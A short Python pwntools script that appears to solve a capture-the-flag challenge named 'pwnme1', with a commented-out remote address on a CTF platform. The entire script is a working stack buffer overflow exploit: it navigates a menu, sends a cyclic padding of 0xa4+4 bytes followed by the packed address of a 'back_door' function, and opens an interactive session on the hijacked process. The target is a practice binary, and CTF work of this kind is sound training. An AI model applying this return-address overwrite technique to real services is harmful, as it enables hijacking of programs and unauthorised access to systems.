from pwn import *


p = process("./pwnme1")
# p = remote("node4.buuoj.cn", 29545)


# this should work, but remote don't have "/home/flag"
back_door = 0x08048677

p.sendlineafter(">> 6. Exit    \n", "5")
pad = cyclic(0xa4+0x4)+p32(back_door)
p.sendlineafter("Please input the name of fruit:", pad)

p.interactive()

